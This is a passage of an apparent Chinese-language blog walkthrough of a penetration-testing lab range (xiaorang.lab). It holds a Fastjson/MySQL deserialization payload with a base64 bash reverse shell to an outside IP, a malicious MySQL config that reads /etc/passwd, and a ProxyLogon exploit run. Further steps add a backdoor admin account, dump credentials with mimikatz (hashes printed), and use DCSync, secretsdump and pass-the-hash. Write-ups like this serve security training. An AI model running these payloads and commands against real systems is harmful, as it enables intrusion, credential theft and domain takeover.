+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;ysoserialPath&#34;</span><span class="p">:</span><span class="s2">&#34;ysoserial-0.0.6-SNAPSHOT-all.jar&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;javaBinPath&#34;</span><span class="p">:</span><span class="s2">&#34;java&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;fileOutputDir&#34;</span><span class="p">:</span><span class="s2">&#34;./fileOutput/&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;displayFileContentOnScreen&#34;</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;saveToFile&#34;</span><span class="p">:</span><span class="kc">true</span>
+</span></span><span class="line"><span class="cl">    <span class="p">},</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;fileread&#34;</span><span class="p">:{</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;win_ini&#34;</span><span class="p">:</span><span class="s2">&#34;c:\\windows\\win.ini&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;win_hosts&#34;</span><span class="p">:</span><span class="s2">&#34;c:\\windows\\system32\\drivers\\etc\\hosts&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;win&#34;</span><span class="p">:</span><span class="s2">&#34;c:\\windows\\&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;linux_passwd&#34;</span><span class="p">:</span><span class="s2">&#34;/etc/passwd&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;linux_hosts&#34;</span><span class="p">:</span><span class="s2">&#34;/etc/hosts&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;index_php&#34;</span><span class="p">:</span><span class="s2">&#34;index.php&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;ssrf&#34;</span><span class="p">:</span><span class="s2">&#34;https://www.baidu.com/&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;__defaultFiles&#34;</span><span class="p">:[</span><span class="s2">&#34;/etc/hosts&#34;</span><span class="p">,</span><span class="s2">&#34;c:\\windows\\system32\\drivers\\etc\\hosts&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="p">},</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;yso&#34;</span><span class="p">:{</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;Jdk7u21&#34;</span><span class="p">:[</span><span class="s2">&#34;Jdk7u21&#34;</span><span class="p">,</span><span class="s2">&#34;calc&#34;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;CommonsCollections6&#34;</span><span class="p">:[</span><span class="s2">&#34;CommonCollections6&#34;</span><span class="p">,</span><span class="s2">&#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMjIuNTMuMjQ4LzIzMzMgMD4mMQ==}|{base64,-d}|{bash,-i}&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>yso放在跟server.py一个目录然后运行就行，这里运行要python版本低一些，这里我下了个3.9的</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo apt update
+</span></span><span class="line"><span class="cl">sudo apt install -y build-essential libssl-dev zlib1g-dev libbz2-dev <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    libreadline-dev libsqlite3-dev libffi-dev libncursesw5-dev libgdbm-dev <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    liblzma-dev tk-dev uuid-dev wget
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> /usr/src
+</span></span><span class="line"><span class="cl">sudo wget https://www.python.org/ftp/python/3.9.18/Python-3.9.18.tgz
+</span></span><span class="line"><span class="cl">sudo tar xzf Python-3.9.18.tgz
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> Python-3.9.18
+</span></span><span class="line"><span class="cl">sudo ./configure --enable-optimizations
+</span></span><span class="line"><span class="cl">sudo make -j<span class="k">$(</span>nproc<span class="k">)</span>
+</span></span><span class="line"><span class="cl">sudo make altinstall
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后<code>/usr/local/bin/python3.9 server.py</code>,网站请求就发编码后的payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{ &#34;name&#34;: { &#34;@type&#34;: &#34;java.lang.AutoCloseable&#34;, &#34;@type&#34;: &#34;com.mysql.jdbc.JDBC4Connection&#34;, &#34;hostToConnectTo&#34;: &#34;47.122.53.248&#34;, &#34;portToConnectTo&#34;: 3306, &#34;info&#34;: { &#34;user&#34;: &#34;yso_CommonsCollections6_bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMjIuNTMuMjQ4LzIzMzMgMD4mMQ==}|{base64,-d}|{bash,-i}&#34;, &#34;password&#34;: &#34;pass&#34;, &#34;statementInterceptors&#34;: &#34;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&#34;, &#34;autoDeserialize&#34;: &#34;true&#34;, &#34;NUM_HOSTS&#34;: &#34;1&#34; } }
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260312204803985.png"
+	width="1855"
+	height="655"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260312204803985_hu2724963731262492234.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260312204803985_hu8549736309272182272.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260312204803985"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="283"
+		data-flex-basis="679px"
+	
+></p>
+<p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260312204856496.png"
+	width="958"
+	height="693"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260312204856496_hu14161865947627172998.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260312204856496_hu13964903525943287031.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260312204856496"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="138"
+		data-flex-basis="331px"
+	
+></p>
+<p>接下来又得古法frp内网穿透和古法wget上传fscan扫描了,这里机子是32位的，然后内网ip是172.22.3.12</p>
+<p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260312210715350.png"
+	width="1118"
+	height="533"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260312210715350_hu7181780618999066044.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260312210715350_hu14978934259174831064.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260312210715350"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="209"
+		data-flex-basis="503px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">172.22.3.9      EXC01
+</span></span><span class="line"><span class="cl">172.22.3.2      DC
+</span></span><span class="line"><span class="cl">172.22.3.26     PC
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>按照给的url访问172.22.3.9是一个outlook界面</p>
+<p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260312211211094.png"
+	width="1618"
+	height="751"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260312211211094_hu3067953105469448126.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260312211211094_hu3789512980429111571.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260312211211094"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="215"
+		data-flex-basis="517px"
+	
+></p>
+<p>其实就是Exchange Server 2016，直接打<a class="link" href="https://github.com/hausec/ProxyLogon"  target="_blank" rel="noopener"
+    >ProxyLogon</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">proxychains4 python2 proxylogon.py 172.22.3.9 administrator@xiaorang.lab
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260312211723825.png"
+	width="1131"
+	height="731"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260312211723825_hu8955354327521148358.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260312211723825_hu5402414202841367561.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260312211723825"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="154"
+		data-flex-basis="371px"
+	
+></p>
+<p>没东西那就添加管理员用户rdp进去拿flag</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">net user 0d00 qwer1234! /add
+</span></span><span class="line"><span class="cl">net localgroup administrators 0d00 /add
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260312212307358.png"
+	width="1789"
+	height="807"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260312212307358_hu9308605226048531662.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260312212307358_hu8340287541803624111.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260312212307358"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="221"
+		data-flex-basis="532px"
+	
+></p>
+<p>查看的过程中发现还有zhangtong这个用户，传个mimikatz看看</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">.<span class="se">\m</span>imikatz.exe <span class="s2">&#34;privilege::debug&#34;</span> <span class="s2">&#34;sekurlsa::logonpasswords&#34;</span> <span class="s2">&#34;exit&#34;</span> &gt; 1.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Authentication Id : <span class="m">0</span> <span class="p">;</span> <span class="m">11978565</span> <span class="o">(</span>00000000:00b6c745<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Session           : Interactive from <span class="m">3</span>
+</span></span><span class="line"><span class="cl">User Name         : DWM-3
+</span></span><span class="line"><span class="cl">Domain            : Window Manager
+</span></span><span class="line"><span class="cl">Logon Server      : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Logon Time        : 2026/3/12 21:21:45
+</span></span><span class="line"><span class="cl">SID               : S-1-5-90-0-3
+</span></span><span class="line"><span class="cl">	msv :	
+</span></span><span class="line"><span class="cl">	 <span class="o">[</span>00000003<span class="o">]</span> Primary
+</span></span><span class="line"><span class="cl">	 * Username : XIAORANG-EXC01$
+</span></span><span class="line"><span class="cl">	 * Domain   : XIAORANG
+</span></span><span class="line"><span class="cl">	 * NTLM     : f37e71617489d914f5a186ae7c646d14
+</span></span><span class="line"><span class="cl">	 * SHA1     : e38cbbb2ea35d17e44aa30e464d459769ed17389
+</span></span><span class="line"><span class="cl">	tspkg :	
+</span></span><span class="line"><span class="cl">	wdigest :	
+</span></span><span class="line"><span class="cl">	 * Username : XIAORANG-EXC01$
+</span></span><span class="line"><span class="cl">	 * Domain   : XIAORANG
+</span></span><span class="line"><span class="cl">	 * Password : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	kerberos :	
+</span></span><span class="line"><span class="cl">	 * Username : XIAORANG-EXC01$
+</span></span><span class="line"><span class="cl">	 * Domain   : xiaorang.lab
+</span></span><span class="line"><span class="cl">	 * Password : 5d a4 cb <span class="m">03</span> b3 3b af 7d <span class="m">42</span> ff 3c da 4b <span class="m">37</span> 2a <span class="m">81</span> 2f <span class="m">25</span> <span class="m">99</span> f1 c2 <span class="m">74</span> 3a a9 6c <span class="m">32</span> 5b <span class="m">26</span> <span class="m">04</span> <span class="m">01</span> <span class="m">85</span> 7c 1d <span class="m">76</span> f3 <span class="m">87</span> <span class="m">71</span> <span class="m">83</span> <span class="m">97</span> c2 <span class="m">29</span> 5c <span class="m">90</span> a5 <span class="m">39</span> 2d d9 <span class="m">54</span> <span class="m">82</span> <span class="m">81</span> d0 <span class="m">23</span> 1b <span class="m">49</span> fd <span class="m">94</span> fb 2c <span class="m">28</span> <span class="m">52</span> <span class="m">74</span> 5e <span class="m">44</span> c0 0a <span class="m">83</span> ec 5b f7 ba <span class="m">86</span> aa ad b4 a0 <span class="m">95</span> 4b 0f 0d f6 b1 c0 <span class="m">09</span> 4c a9 <span class="m">99</span> <span class="m">88</span> 2b 1e <span class="m">01</span> <span class="m">30</span> <span class="m">53</span> <span class="m">87</span> 1a 7f 8c <span class="m">14</span> 9a <span class="m">25</span> ed a1 0d 9a 9b <span class="m">71</span> 8e <span class="m">26</span> <span class="m">82</span> ea b8 b2 6c fa da <span class="m">01</span> 8b <span class="m">57</span> e5 ee e0 8c <span class="m">52</span> cb f3 2d e1 2b bb be de <span class="m">86</span> <span class="m">03</span> bc 1f ce e0 f7 0a 8d ca d0 a9 9c <span class="m">83</span> <span class="m">91</span> <span class="m">28</span> 5d f7 <span class="m">79</span> <span class="m">45</span> <span class="m">68</span> <span class="nb">cd</span> a7 <span class="m">20</span> <span class="m">47</span> c3 e1 <span class="m">58</span> a6 b2 e5 <span class="m">83</span> <span class="m">94</span> c6 <span class="m">44</span> fa a0 <span class="m">03</span> 0c d6 <span class="m">25</span> b7 <span class="m">70</span> <span class="m">89</span> a3 <span class="m">77</span> <span class="m">24</span> e1 7f 1a <span class="m">81</span> 0d 6e <span class="m">16</span> 0b <span class="m">74</span> <span class="m">39</span> <span class="m">03</span> e3 c5 <span class="m">17</span> <span class="m">11</span> <span class="m">34</span> <span class="m">97</span> 5a 6a <span class="m">87</span> 1d <span class="m">74</span> 5e e9 eb <span class="m">83</span> <span class="m">97</span> 6e f5 ba <span class="m">11</span> 4d <span class="m">75</span> c8 <span class="m">26</span> <span class="m">81</span> eb <span class="m">43</span> 3f 8d ec f8 da <span class="m">31</span> <span class="m">56</span> <span class="m">83</span> c8 <span class="m">83</span> ab 8b 3d <span class="m">34</span> b8 e5 b6 a1 b9 f3 6a <span class="m">70</span> <span class="m">38</span> 9c 9f 
+</span></span><span class="line"><span class="cl">	ssp :	
+</span></span><span class="line"><span class="cl">	credman :
+</span></span><span class="line"><span class="cl">Authentication Id : <span class="m">0</span> <span class="p">;</span> <span class="m">104333</span> <span class="o">(</span>00000000:0001978d<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Session           : Service from <span class="m">0</span>
+</span></span><span class="line"><span class="cl">User Name         : Zhangtong
+</span></span><span class="line"><span class="cl">Domain            : XIAORANG
+</span></span><span class="line"><span class="cl">Logon Server      : XIAORANG-WIN16
+</span></span><span class="line"><span class="cl">Logon Time        : 2026/3/12 19:56:15
+</span></span><span class="line"><span class="cl">SID               : S-1-5-21-533686307-2117412543-4200729784-1147
+</span></span><span class="line"><span class="cl">	msv :	
+</span></span><span class="line"><span class="cl">	 <span class="o">[</span>00000003<span class="o">]</span> Primary
+</span></span><span class="line"><span class="cl">	 * Username : Zhangtong
+</span></span><span class="line"><span class="cl">	 * Domain   : XIAORANG
+</span></span><span class="line"><span class="cl">	 * NTLM     : 22c7f81993e96ac83ac2f3f1903de8b4
+</span></span><span class="line"><span class="cl">	 * SHA1     : 4d205f752e28b0a13e7a2da2a956d46cb9d9e01e
+</span></span><span class="line"><span class="cl">	 * DPAPI    : ed14c3c4ef895b1d11b04fb4e56bb83b
+</span></span><span class="line"><span class="cl">	tspkg :	
+</span></span><span class="line"><span class="cl">	wdigest :	
+</span></span><span class="line"><span class="cl">	 * Username : Zhangtong
+</span></span><span class="line"><span class="cl">	 * Domain   : XIAORANG
+</span></span><span class="line"><span class="cl">	 * Password : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	kerberos :	
+</span></span><span class="line"><span class="cl">	 * Username : Zhangtong
+</span></span><span class="line"><span class="cl">	 * Domain   : XIAORANG.LAB
+</span></span><span class="line"><span class="cl">	 * Password : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	ssp :	
+</span></span><span class="line"><span class="cl">	credman :
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>用<a class="link" href="https://github.com/dirkjanm/BloodHound.py"  target="_blank" rel="noopener"
+    >bloodhound</a>对域环境进行信息收集</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">proxychains4 -q python3 bloodhound.py -u <span class="s2">&#34;XIAORANG-EXC01</span>$<span class="s2">&#34;</span> --hashes f37e71617489d914f5a186ae7c646d14:f37e71617489d914f5a186ae7c646d14 -d xiaorang.lab -dc XIAORANG-WIN16.xiaorang.lab -c all --dns-tcp -ns 172.22.3.2 --auth-method ntlm --zip
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260312221559714.png"
+	width="1689"
+	height="368"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260312221559714_hu17782803970641082860.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260312221559714_hu11506381000867955423.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260312221559714"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="458"
+		data-flex-basis="1101px"
+	
+></p>
+<p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260312222018569.png"
+	width="1021"
+	height="124"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260312222018569_hu7319310974359461718.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260312222018569_hu2432257590153951177.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260312222018569"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="823"
+		data-flex-basis="1976px"
+	
+></p>
+<p>在 Active Directory 环境中，安装了 Exchange Server 后会添加一个名为 Microsoft Exchange Security Groups 的 OU，其中包括两个特殊的组：<code>Exchange Trusted Subsystem</code> 和 <code>Exchange Windows Permission</code>。如果获得了这两个组内任意用户的控制权限，就能够继承该组的 WriteDACL 权限，进而修改域对象的 ACL，最终实现利用 DCSync 导出域内所有用户 hash。</p>
+<p>添加DCsync</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">proxychains4 python dacledit.py xiaorang.lab/XIAORANG-EXC01<span class="se">\$</span> -hashes :f37e71617489d914f5a186ae7c646d14 -action write -rights DCSync -principal Zhangtong -target-dn <span class="s2">&#34;DC=xiaorang,DC=lab&#34;</span> -dc-ip 172.22.3.2
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260312223058946.png"
+	width="1699"
+	height="188"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260312223058946_hu6244522455780380160.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260312223058946_hu4923322539610528218.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260312223058946"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="903"
+		data-flex-basis="2168px"
+	
+></p>
+<p>然后用secretsdump哈希</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">proxychains4 python3 secretsdump.py xiaorang.lab/Zhangtong@172.22.3.2 -hashes :22c7f81993e96ac83ac2f3f1903de8b4 -just-dc-ntlm
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260312223211966.png"
+	width="898"
+	height="585"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260312223211966_hu3781554336019476902.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260312223211966_hu8472555281752699046.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260312223211966"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="153"
+		data-flex-basis="368px"
+	
+></p>
+<p>观察到Administrator的hash</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">xiaorang.lab<span class="se">\A</span>dministrator:500:aad3b435b51404eeaad3b435b51404ee:7acbc09a6c0efd81bfa7d5a1d4238beb:::
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>直接横向拿shell了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">proxychains4 python3 wmiexec.py xiaorang.lab/Administrator@172.22.3.2 -hashes :7acbc09a6c0efd81bfa7d5a1d4238beb -dc-ip 172.22.3.2
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260312223540537.png"
+	width="755"
+	height="203"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260312223540537_hu3104112659670332668.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260312223540537_hu5412242065073009128.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260312223540537"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="371"
+		data-flex-basis="892px"
+	
+></p>
+<p>最后剩一个flag3,dump邮件内容，用到<a class="link" href="https://github.com/Jumbo-WJB/PTH_Exchange"  target="_blank" rel="noopener"
+    >PTH_Exchange</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">proxychains4 python3 pthexchange.py --target https://172.22.3.9/ --username Lumia --password <span class="s1">&#39;00000000000000000000000000000000:862976f8b23c13529c2fb1428e710296&#39;</span> --action Download
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260312225557308.png"
+	width="1676"
+	height="455"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260312225557308_hu4657996176548991632.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260312225557308_hu4595059179549461190.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260312225557308"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="368"
+		data-flex-basis="884px"
+	
+></p>
+<p>有个加密的压缩包，eml文件提示密码是手机号码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">zip2john secret.zip &gt;zip.txt
+</span></span><span class="line"><span class="cl">tail -n +2 data.csv <span class="p">|</span> cut -d<span class="s1">&#39;,&#39;</span> -f3 &gt; 1.txt
+</span></span><span class="line"><span class="cl">john --wordlist<span class="o">=</span>1.txt zip.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>爆出密码解压就拿到flag3了</p>
+<p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260312230656446.png"
+	width="919"
+	height="544"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260312230656446_hu17176831717831789379.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260312230656446_hu728835467944913365.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260312230656446"
+	
